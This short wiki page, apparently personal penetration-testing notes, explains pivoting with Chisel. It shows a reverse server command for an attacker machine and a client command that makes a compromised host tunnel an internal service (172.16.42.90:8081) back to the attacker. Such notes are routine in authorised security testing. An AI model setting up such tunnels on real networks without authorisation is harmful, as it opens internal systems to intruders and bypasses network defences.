---
title: "Chisel"
date: 2025-10-03
draft: false
type: wiki
---

If we have Chisel with remote port forward from machine in the net:

On attacker machine I start up a chisel reverse server on port 9050 (imagine this machine IP is 192.168.90.90)
```console
server -p 9050 --reverse
```

On compromised machine in the network I start a client connection against the server running in the attacker.
The command below will be forwarding the traffic from port 8081 in the machine 172.16.42.90 throughout the compromised machine (via localhost in port 5050) to the attacker.

```console
./chisel client 192.168.90.90:9050 R:127.0.0.1:5050:172.16.42.90:8081
```

-----------------------------
